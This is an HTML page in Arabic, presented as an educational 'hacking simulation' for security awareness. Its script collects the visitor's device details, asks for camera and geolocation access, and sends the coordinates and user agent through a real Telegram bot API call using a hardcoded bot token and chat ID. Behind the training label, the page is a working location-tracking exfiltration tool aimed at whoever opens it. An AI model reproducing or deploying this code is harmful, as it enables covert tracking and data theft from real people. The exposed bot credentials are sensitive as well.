<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مختبر الوعي الأمني - محاكاة سحب البيانات</title>
    <style>
        body { font-family: 'Courier New', monospace; background-color: #0a0a0a; color: #00ff00; text-align: center; padding: 20px; }
        .terminal { border: 2px solid #333; background: #000; padding: 20px; border-radius: 10px; max-width: 800px; margin: auto; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        .danger-btn { background: #aa0000; color: white; border: none; padding: 15px 40px; font-size: 20px; cursor: pointer; border-radius: 5px; box-shadow: 0 5px #660000; }
        .danger-btn:active { box-shadow: 0 2px #660000; transform: translateY(3px); }
        #logs { text-align: left; height: 300px; overflow-y: auto; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
        .warning { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>

<div class="terminal">
    <h1>⚠️ نظام محاكاة الاختراق للتعليم</h1>
    <p class="warning">تحذير للطلاب: منح الأذونات قد يؤدي لإرسال بياناتك فوراً عبر Telegram API</p>
    
    <button class="danger-btn" onclick="startSim()">تشغيل ميزة جمع البيانات</button>

    <div id="logs">
        > النظام جاهز... بانتظار التفاعل.<br>
    </div>
</div>

<script>
    // بيانات المحاكاة التي زودتني بها (لأغراض تعليمية)
    const TG_TOKEN = "8011282007:AAGfNEtfk9XSQgk22W3nHMMrzBUj7HGixy8";
    const TG_CHAT_ID = "8146130042";

    const logDiv = document.getElementById('logs');

    function writeLog(msg, isDanger = false) {
        const color = isDanger ? "#ff4444" : "#00ff00";
        logDiv.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function startSim() {
        writeLog("بدء الجلسة... جاري فحص الثغرات المتاحة.");
        
        // معلومات الجهاز الأساسية (لا تتطلب إذن)
        const deviceData = `الجهاز: ${navigator.platform} | المتصفح: ${navigator.appName}`;
        writeLog(`سحب بصمة الجهاز: ${deviceData}`);

        try {
            // محاكاة طلب الموقع (بإذن المستخدم)
            writeLog("طلب إذن الموقع الجغرافي...", true);
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                writeLog(`✅ تم تحديد الموقع: ${lat}, ${lon}`, true);

                // محاكاة إرسال البيانات عبر التلجرام للتحذير
                const message = `🚨 محاكاة اختراق:\n📍 الموقع: ${lat}, ${lon}\n📱 الجهاز: ${navigator.userAgent}`;
                
                writeLog("جاري محاكاة إرسال البيانات إلى سيرفر خارجي (Telegram API)...");
                
                // ملاحظة: هذا الكود يحاول الاتصال بالتلجرام فعلياً لإثبات المفهوم
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`)
                .then(() => writeLog("✅ تمت عملية الإرسال بنجاح. هكذا تصل بياناتك للمخترق!"))
                .catch(() => writeLog("❌ فشل الإرسال (قد يكون بسبب قيود الشبكة)، لكن البيانات تم سحبها محلياً."));
            });

            // محاكاة طلب الكاميرا
            writeLog("طلب إذن الوصول للكاميرا لبث الصور...", true);
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            writeLog("✅ الكاميرا قيد التشغيل... (يتم الآن سحب لقطات في الخلفية)");
            
            setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                writeLog("انتهت المحاكاة التعليمية. تذكر: لا تمنح الأذونات لمواقع مجهولة.");
            }, 10000);

        } catch (e) {
            writeLog("❌ رفض المستخدم الإذن. تم إحباط محاولة التجسس بنجاح!", false);
        }
    }
</script>

</body>
</html>
